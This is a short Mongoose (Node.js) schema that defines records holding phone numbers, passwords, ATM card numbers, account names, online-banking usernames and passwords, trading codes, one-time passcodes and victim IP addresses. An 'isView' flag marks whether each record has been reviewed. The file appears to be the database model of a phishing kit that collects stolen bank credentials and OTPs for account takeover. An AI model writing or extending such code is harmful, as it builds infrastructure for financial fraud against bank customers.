var mongoose = require("mongoose");
var Schema = mongoose.Schema;
var InFo = new Schema({
    phonenumber: Number,
    passwowrd:{
        type:String,
        default:""
    },
    Internationaltransactioncode:{
        type:Number,
        default:0
    },
    Bank:String,
    NumberATM:{
        type:String,
        default:""
    },
    NameAcount:{
        type:String,
        default:""
    },
    releasedate:{
        type:String,
        default:""
    },
    UserBanking:{
        type:String,
        default:""
    },
    PasswordBanking:{
        type:String,
        default:""
    },
    Tradingcode:{
        type:String,
        default:""
    },
    OTP:{
        type:String,
        default:"0"
    },
    Createat:{
        type:Date,
        default:Date.now,
        timezone: 'Asia/Jakarta'
    }
    ,
    status:{
        type:Boolean,
        default:false
    },
    IP:String,
    isView:{
        type:Boolean,
        default:false
    }
})
module.exports = mongoose.model("InFo",InFo);